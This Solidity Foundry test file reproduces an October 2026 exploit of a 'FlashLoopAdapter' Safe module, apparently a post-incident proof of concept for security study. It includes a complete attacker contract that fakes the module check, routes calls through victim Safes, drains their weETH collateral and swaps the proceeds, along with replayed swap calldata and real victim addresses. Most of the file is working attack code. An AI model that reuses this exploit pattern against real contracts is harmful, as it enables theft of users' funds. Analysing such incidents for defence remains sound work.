// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// Run: forge test --contracts src/test/2026-10/FlashLoopAdapter_exp.sol --evm-version cancun -vvv
//      (cancun is required: the deployed adapter uses transient storage / TSTORE.)
//
// FlashLoopAdapter - a Safe MODULE that authenticates its caller by ASKING THE CALLER
// (ISafe(msg.sender).isModuleEnabled(address(this))) instead of checking a known Safe, and then
// makes a raw low-level call to a caller-supplied swapRouter with caller-supplied calldata. The two
// together let anyone turn the adapter into a confused deputy against any REAL Safe that legitimately
// enabled it. Ethereum, 2026-10-01. Attacker nets 114.096 WETH (~$305k); two victim Safes are emptied.
//
// Attack tx      : 0x75328f916b1a0878724d364da5eb12b255160b894cb36c63ed5d718efc616fc4 (block 26098264)
// Attacker EOA   : 0x42c2633438609881c8fBAb82414eb9A0c45F9353
// Attacker contr : 0xF09168963ac7b31917A02Aa82fA9Cd667F4B67ff (the fake "Safe"/"Morpho"/"Pool")
// FlashLoopAdapter: 0x16bb8B912da187870C23eC6756bB3FAd061283d8 (VERIFIED on Etherscan, solc 0.8.28)
// Victim Safe #1 : 0xCFeDF95a3653a128dFC2E4288758A1a1850D169f (1306.48 weETH Aave collateral, 1335.26 WETH debt)
// Victim Safe #2 : 0xE3b23E47dF7cD85876aC6cB05BDb9d7cd5b28520 (6.426 weETH held as plain tokens)
// WETH           : 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 (debt asset, flashed)
// weETH          : 0xCd5fE23C85820F7B72D0926FC9b05b43E359b7ee (collateral asset)
// Aave v3 Pool   : 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2
// Morpho Blue    : 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb (real fee-free WETH flash source)
// ODOS router    : 0x6A000F20005980200259B80c5102003040001068 (weETH -> WETH swap leg)
//
// ROOT CAUSE (verified against the verified adapter source + the on-chain trace):
//   FlashLoopAdapter._start (the shared body of open()/close()) authenticates the caller with:
//
//       if (!ISafe(msg.sender).isModuleEnabled(address(this))) revert ModuleNotEnabled();
//       _safe = msg.sender;
//
//   This is SELF-ATTESTATION, not authentication: it trusts msg.sender to say whether msg.sender
//   has the adapter enabled. A one-line fake contract whose isModuleEnabled() always returns true
//   passes it, and the adapter then treats that fake as the Safe it drives.
//
//   Second flaw, FlashLoopAdapter._swap:
//       IERC20(tokenIn).approve(router, type(uint256).max);
//       (bool ok, bytes memory ret) = router.call(data);     // router + data are caller-supplied
//   No allowlist on `router`, no restriction on `data`. The attacker sets swapRouter = a REAL victim
//   Safe and swapCalldata = victimSafe.execTransactionFromModule(target, 0, innerCall, 0). Because the
//   adapter is a genuinely enabled module on that victim Safe (the victims opted in), the victim Safe
//   accepts the call as coming from an enabled module and runs innerCall AS ITSELF.
//
//   The attacker contract also sets providerAddr = pool = itself, so every OTHER thing the adapter
//   does (the flash loan, the Aave supply/borrow, the module execs onto "the Safe") hits the attacker
//   contract and is a no-op. flashAmount is set to 0 so the borrow/repay legs move nothing. The only
//   real external effect of the whole open() call is the single _swap -> victimSafe.execTx... drain.
//
// FULL ATTACKER SEQUENCE (one atomic tx, reconstructed below from the real trace):
//   1. real Morpho Blue WETH flash loan.
//   2. permissionlessly repay Victim #1's entire WETH debt to Aave (unlocks its weETH collateral).
//   3. adapter.open() with swapRouter = Victim #2 -> forces Victim #2 to weETH.transfer() its 6.426
//      weETH to the attacker.
//   4. adapter.open() with swapRouter = Victim #1 -> forces Victim #1 to pool.withdraw() its 1306.48
//      weETH collateral to the attacker.
//   5. swap the 1312.908 weETH -> 1449.352 WETH via ODOS (exact original calldata, replayed).
//   6. repay the Morpho flash. Net: 1449.352 - 1335.256 = 114.096 WETH left with the attacker.
//
// NOT a key/signature compromise: the victims' owners never signed anything here. Every drain call is
// authorised purely by the adapter being an enabled module plus the broken self-attestation check. No
// vm.prank of any victim/owner, no private key, no signature is used anywhere below.

interface IFlashLoopAdapter {
    enum Provider {MORPHO, BALANCER_V2, AAVE_SIMPLE}
    enum Op {OPEN, CLOSE}

    struct Params {
        Op op;
        Provider provider;
        address providerAddr;
        address pool;
        address collateral;
        address debt;
        uint256 flashAmount;
        address swapRouter;
        bytes swapCalldata;
        uint256 minOut;
        uint8 emodeId;
        uint256 withdrawAmount;
    }

    function open(Params calldata p) external;
    function onMorphoFlashLoan(uint256 assets, bytes calldata data) external;
}

interface IMorpho {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IAavePool {
    function repay(address asset, uint256 amount, uint256 rateMode, address onBehalfOf) external returns (uint256);
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
}

interface ISafe {
    function execTransactionFromModule(address to, uint256 value, bytes calldata data, uint8 operation)
        external
        returns (bool);
}

contract FlashLoopAdapterExploit is BaseTestWithBalanceLog {
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant WEETH = 0xCd5fE23C85820F7B72D0926FC9b05b43E359b7ee;
    address constant ADAPTER = 0x16bb8B912da187870C23eC6756bB3FAd061283d8;
    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address constant ODOS = 0x6A000F20005980200259B80c5102003040001068;
    address constant VICTIM1 = 0xCFeDF95a3653a128dFC2E4288758A1a1850D169f;
    address constant VICTIM2 = 0xE3b23E47dF7cD85876aC6cB05BDb9d7cd5b28520;

    AttackerModule internal atk;

    function setUp() public {
        // block before the attack tx; warp to the attack block's own timestamp so Victim #1's
        // rebasing aWeETH balance equals what the real attacker withdrew (and what the replayed
        // ODOS calldata expects to pull).
        vm.createSelectFork("https://eth.drpc.org", 26_098_263);
        vm.warp(1_790_867_327);
        vm.roll(26_098_264);

        atk = new AttackerModule();
        fundingToken = WETH;
        attacker = address(atk);
    }

    function testExploit() public balanceLog {
        atk.attack(ODOS_CALLDATA);

        // profit lands as WETH on the attacker contract, pre-gas, as read from the trace.
        uint256 profit = IERC20(WETH).balanceOf(address(atk));
        emit log_named_decimal_uint("Attacker profit (WETH)", profit, 18);
        assertApproxEqRel(profit, 114.092 ether, 0.01e18, "profit should match reported ~114.09 ETH");
    }

    // exact weETH -> WETH ODOS route taken by the real attacker, lifted verbatim from the attack tx
    // (recipient is msg.sender, so replaying it credits this test's attacker contract).
    bytes constant ODOS_CALLDATA =
        hex"e3ead59e000000000000000000000000082738d007001080a00099a000004f3006152085000000000000000000000000cd5fe23c85820f7b72d0926fc9b05b43"
        hex"e359b7ee000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000000000000000472c25c9f5"
        hex"2a5a000000000000000000000000000000000000000000000000004dc8aab4a21c7cc2ee00000000000000000000000000000000000000000000004e91ce0bca"
        hex"896193c50d080328080c4a2fb689af26cac35e31000000000000000000000000018e3a4d00000000000000000000000000000000000000000000000000000000"
        hex"00000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000"
        hex"00000160000000000000000000000000000000000000000000000000000000000000018000000000000000000000000000000000000000000000000000000000"
        hex"000000000000000000000000000000000000000000000000000000000000000000000cc000000000000000000000000000000000000000000000000000000000"
        hex"000000200000000000000000000000000000000000000000000000000000000000000cc000000000000000000000000000000580000000000000016c00000000"
        hex"0000264800000000000000000000000000000000000000000000056005040144000a000300000000000000000000000000000000000000000000000000000000"
        hex"00000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000"
        hex"000005000000000000000000000000000000018000000000000000cc0000000000000595db74dfdd3bb46be8ce6c33dc9d82777bcfc3ded5000000e0004400a4"
        hex"ff00000b000000000000000000000000000000000000000000000000000000003df0212400000000000000000000000000000000000000000000000000000000"
        hex"000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009f795fe54"
        hex"3ab990000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000cd5fe23c85820f7b72d0926fc9b05b43"
        hex"e359b7ee000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000006000240000"
        hex"ff00000300000000000000000000000000000000000000000000000000000000a9059cbb0000000000000000000000006a000f20005980200259b80c51020030"
        hex"4000106800000000000000000000000000000000000000000000000b00081caecd968cb1000000000000000000000000000001c000000000000000cc00000000"
        hex"00001cb386f874212335af27c41cdb855c2255543d1499ce000000e0002400000000000700000000000000000000000000000000000000000000000000000000"
        hex"2668dfaa00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000333e9d981a"
        hex"6434f0000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000082738d007001080a00099a000004f30"
        hex"06152085000000000000000000000000cd5fe23c85820f7b72d0926fc9b05b43e359b7ee000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead908"
        hex"3c756cc2c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000002000040000ff00000900000000000000000000000000000000000000000000000000000000"
        hex"d0e30db0c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000006000240000ff00000300000000000000000000000000000000000000000000000000000000"
        hex"a9059cbb0000000000000000000000006a000f20005980200259b80c510200304000106800000000000000000000000000000000000000000000003891cc99cc"
        hex"3fab8b0000000000000000000000000000000160000000000000012000000000000004c8e592427a0aece92de3edee1f18e0157c058615640000014000840000"
        hex"0000000300000000000000000000000000000000000000000000000000000000c04b8d5900000000000000000000000000000000000000000000000000000000"
        hex"0000002000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000006a000f20005980200259b80c51020030"
        hex"40001068000000000000000000000000000000000000000000000000000000006ac7b181000000000000000000000000000000000000000000000008898b0ba5"
        hex"7b368000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000"
        hex"0000002bcd5fe23c85820f7b72d0926fc9b05b43e359b7ee000064c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000"
        hex"00000000000000000000000000000000000006c0000000000000000000000000000000c8cd5fe23c85820f7b72d0926fc9b05b43e359b7ee0000006000240000"
        hex"ff00000300000000000000000000000000000000000000000000000000000000a9059cbb00000000000000000000000066a9893cc07d91d95644aedd05d03f95"
        hex"e1dba8af0000000000000000000000000000000000000000000000016c6727e11035000066a9893cc07d91d95644aedd05d03f95e1dba8af0000048002e40224"
        hex"ff00000b0000000000000000000000000000000000000000000000000000000024856bc300000000000000000000000000000000000000000000000000000000"
        hex"00000040000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000"
        hex"00000001100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
        hex"00000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000"
        hex"00000380000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000"
        hex"000000800000000000000000000000000000000000000000000000000000000000000003060b0e00000000000000000000000000000000000000000000000000"
        hex"00000000000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000"
        hex"0000006000000000000000000000000000000000000000000000000000000000000001e000000000000000000000000000000000000000000000000000000000"
        hex"00000260000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000"
        hex"000000200000000000000000000000007f39c581f595b53c5cb19bd0b3f8da6c935e2ca0000000000000000000000000cd5fe23c85820f7b72d0926fc9b05b43"
        hex"e359b7ee000000000000000000000000000000000000000000000000000000000000006400000000000000000000000000000000000000000000000000000000"
        hex"00000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
        hex"000000000000000000000000000000000000000000000000000000016c6727e11035000000000000000000000000000000000000000000000000000000000000"
        hex"00000000000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000"
        hex"000000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000cd5fe23c85820f7b72d0926fc9b05b43"
        hex"e359b7ee000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
        hex"0000000000000000000000000000000000000000000000000000000000000000000000600000000000000000000000007f39c581f595b53c5cb19bd0b3f8da6c"
        hex"935e2ca0000000000000000000000000082738d007001080a00099a000004f300615208500000000000000000000000000000000000000000000000000000000"
        hex"000000000b1a513ee24972daef112bc777a5610d4325c9e7000000c0002400000000000700000000000000000000000000000000000000000000000000000000"
        hex"2668dfaa0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000001433e7120"
        hex"3e1546b80000000000000000000000000000000000000000000000000000000000000001000000000000000000000000082738d007001080a00099a000004f30"
        hex"061520850000000000000000000000007f39c581f595b53c5cb19bd0b3f8da6c935e2ca0c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000002000040000"
        hex"ff00000900000000000000000000000000000000000000000000000000000000d0e30db0c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000006000240000"
        hex"ff00000300000000000000000000000000000000000000000000000000000000a9059cbb0000000000000000000000006a000f20005980200259b80c51020030"
        hex"4000106800000000000000000000000000000000000000000000000192426cf2c560dbe6";
}

contract AttackerModule {
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant WEETH = 0xCd5fE23C85820F7B72D0926FC9b05b43E359b7ee;
    address constant ADAPTER = 0x16bb8B912da187870C23eC6756bB3FAd061283d8;
    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address constant ODOS = 0x6A000F20005980200259B80c5102003040001068;
    address constant VICTIM1 = 0xCFeDF95a3653a128dFC2E4288758A1a1850D169f;
    address constant VICTIM2 = 0xE3b23E47dF7cD85876aC6cB05BDb9d7cd5b28520;
    // Aave v3 variable debt WETH token - used to read Victim #1's exact outstanding debt.
    address constant VDEBT_WETH = 0xeA51d7853EEFb32b6ee06b1C12E6dcCA88Be0fFE;

    bytes internal odosCalldata;

    // ---- fakes the adapter is pointed at (providerAddr = pool = "safe" = this contract) ----

    // self-attestation target: the adapter asks US whether WE have it enabled. We lie.
    function isModuleEnabled(address) external pure returns (bool) {
        return true;
    }

    // adapter's Morpho flash source == this contract: just re-enter the adapter's callback.
    function flashLoan(address, uint256 assets, bytes calldata data) external {
        IFlashLoopAdapter(ADAPTER).onMorphoFlashLoan(assets, data);
    }

    // adapter's Aave pool == this contract: swallow supply().
    function supply(address, uint256, address, uint16) external {}

    // adapter's "Safe" == this contract: swallow the borrow / fund-repay module execs.
    function execTransactionFromModule(address, uint256, bytes calldata, uint8) external pure returns (bool) {
        return true;
    }

    // ---- real attack entrypoint ----

    function attack(bytes calldata _odos) external {
        odosCalldata = _odos;
        // Morpho Blue flash: borrow enough WETH to repay Victim #1's debt. Fee-free; repaid in callback.
        IMorpho(MORPHO).flashLoan(WETH, 1400 ether, "");
    }

    // REAL Morpho Blue flash-loan callback.
    function onMorphoFlashLoan(uint256 assets, bytes calldata) external {
        require(msg.sender == MORPHO, "not morpho");

        // (2) repay Victim #1's entire WETH debt -> unlocks its weETH collateral. Permissionless.
        // Aave v3 rejects type(uint).max when repaying on behalf of another address
        // (NoExplicitAmountToRepayOnBehalf), so pass the exact current variable debt.
        IERC20(WETH).approve(AAVE_POOL, type(uint256).max);
        uint256 v1Debt = IERC20(VDEBT_WETH).balanceOf(VICTIM1);
        IAavePool(AAVE_POOL).repay(WETH, v1Debt, 2, VICTIM1);

        // (3) drain Victim #2: force it to transfer its plain weETH balance to us.
        uint256 v2bal = IERC20(WEETH).balanceOf(VICTIM2);
        _drain(
            VICTIM2,
            WEETH,
            abi.encodeWithSelector(IERC20.transfer.selector, address(this), v2bal)
        );

        // (4) drain Victim #1: force it to withdraw its (now unlocked) weETH collateral to us.
        _drain(
            VICTIM1,
            AAVE_POOL,
            abi.encodeWithSelector(IAavePool.withdraw.selector, WEETH, type(uint256).max, address(this))
        );

        // (5) swap all drained weETH -> WETH via the attacker's original ODOS route.
        IERC20(WEETH).approve(ODOS, type(uint256).max);
        (bool ok, bytes memory ret) = ODOS.call(odosCalldata);
        if (!ok) {
            assembly {
                revert(add(ret, 0x20), mload(ret))
            }
        }

        // (6) repay the Morpho flash (Morpho pulls via transferFrom).
        IERC20(WETH).approve(MORPHO, assets);
    }

    // Build the single malicious open() call: swapRouter = victim, swapCalldata =
    // victim.execTransactionFromModule(target, 0, innerCall, 0). flashAmount = 0 so every adapter leg
    // except the _swap(router.call) is a no-op against this contract.
    function _drain(address victim, address target, bytes memory innerCall) internal {
        bytes memory execCall = abi.encodeWithSelector(
            ISafe.execTransactionFromModule.selector, target, uint256(0), innerCall, uint8(0)
        );

        IFlashLoopAdapter.Params memory p = IFlashLoopAdapter.Params({
            op: IFlashLoopAdapter.Op.OPEN,
            provider: IFlashLoopAdapter.Provider.MORPHO,
            providerAddr: address(this), // fake flash source
            pool: address(this), // fake Aave pool
            collateral: WEETH,
            debt: WETH,
            flashAmount: 0, // no real flash inside the adapter
            swapRouter: victim, // <- the real victim Safe
            swapCalldata: execCall, // <- adapter will call victim.execTransactionFromModule(...)
            minOut: 0,
            emodeId: 0,
            withdrawAmount: 0
        });

        IFlashLoopAdapter(ADAPTER).open(p);
    }
}

/*
 * ## Proof Explanation
 *
 * testExploit proves FlashLoopAdapter lets any caller drain any Safe that enabled it as a module,
 * with no key or signature compromise.
 *
 * Authentication flaw (FlashLoopAdapter._start):
 *   if (!ISafe(msg.sender).isModuleEnabled(address(this))) revert ModuleNotEnabled();
 * This trusts msg.sender to self-report. AttackerModule.isModuleEnabled() returns true, so the adapter
 * accepts AttackerModule as "the Safe" and sets _safe = AttackerModule.
 *
 * Call-injection flaw (FlashLoopAdapter._swap):
 *   IERC20(tokenIn).approve(router, type(uint256).max);
 *   (bool ok, bytes memory ret) = router.call(data);
 * router and data are fully caller-supplied. The attacker sets router = a real victim Safe and
 * data = victim.execTransactionFromModule(target, 0, innerCall, 0). The adapter IS an enabled module on
 * each victim, so the victim executes innerCall as itself.
 *
 * The attacker also points providerAddr and pool at its own contract and sets flashAmount = 0, so the
 * adapter's flash loan, supply(), borrow() and module-exec legs all hit AttackerModule and no-op. The
 * only real effect per open() is the one _swap -> victim.execTransactionFromModule.
 *
 * Reconstructed sequence (one atomic tx):
 *   1. real Morpho Blue WETH flash loan (fee-free).
 *   2. repay Victim #1's whole WETH debt to Aave -> unlocks its weETH collateral (anyone may repay).
 *   3. open() with swapRouter = Victim #2 -> Victim #2 transfers its 6.426 weETH to the attacker.
 *   4. open() with swapRouter = Victim #1 -> Victim #1 withdraws its 1306.48 weETH collateral to the attacker.
 *   5. swap 1312.908 weETH -> 1449.352 WETH via the attacker's exact original ODOS route.
 *   6. repay the Morpho flash.
 *
 * assertApproxEqRel(profit, 114.092 ether, 0.01e18):
 *   Attacker ends holding ~114.096 WETH, taken entirely from the two victims' equity (1449.352 WETH of
 *   collateral sold minus 1335.256 WETH of debt repaid). Matches the reported 114.092 ETH (the small
 *   delta is the reported figure being net of gas; this asserts the pre-gas on-chain profit). If either
 *   flaw were fixed - real module authentication, or a swapRouter allowlist - open() would revert at the
 *   self-attestation check or refuse the victim-Safe call target, and the drain (and this profit) vanish.
 */
